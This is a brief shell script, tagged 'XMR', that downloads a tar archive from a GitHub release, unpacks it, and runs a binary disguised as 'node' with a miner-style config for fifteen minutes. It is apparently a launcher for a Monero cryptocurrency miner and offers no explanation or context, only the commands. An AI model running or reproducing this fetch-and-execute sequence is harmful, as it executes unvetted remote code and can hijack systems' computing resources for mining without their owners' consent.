#!/bin/sh
#
#
#XMR

wget https://github.com/wikangdijalalan2/xmmxja/releases/download/v1.3/MXC.tar
tar -xvf MXC.tar
cd MXC
timeout 15m ./node mr.ini
